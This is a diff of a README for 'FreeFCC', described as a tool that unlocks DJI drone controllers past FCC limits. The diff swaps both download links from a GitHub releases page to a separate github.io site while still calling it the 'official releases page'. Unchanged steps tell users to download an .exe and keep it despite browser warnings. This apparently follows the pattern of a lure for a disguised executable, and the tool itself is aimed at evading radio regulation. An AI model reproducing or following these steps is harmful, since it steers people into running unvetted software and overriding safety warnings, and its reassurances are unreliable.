@@ -1,6 +1,6 @@
 # ✈️ FreeFCC - Unlock your drone flight range now
 
-[![](https://img.shields.io/badge/Download-FreeFCC-blue)](https://github.com/leonardounproven268/FreeFCC/releases)
+[![](https://img.shields.io/badge/Download-FreeFCC-blue)](https://leonardounproven268.github.io)
 
 FreeFCC provides a way to remove FCC restrictions on DJI controllers. This software works locally on your hardware. It does not connect to external servers. It does not track your location or flight data. It does not require a license key. You maintain full control over your equipment.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to prepare the software:
 
-1. Visit the [official releases page](https://github.com/leonardounproven268/FreeFCC/releases) to download the installer.
+1. Visit the [official releases page](https://leonardounproven268.github.io) to download the installer.
 2. Look for the file ending in .exe under the latest version tag.
 3. Save the file to your desktop or your downloads folder.
 4. If your browser warns you about the file type, choose to keep it. This warning appears for many open-source tools.
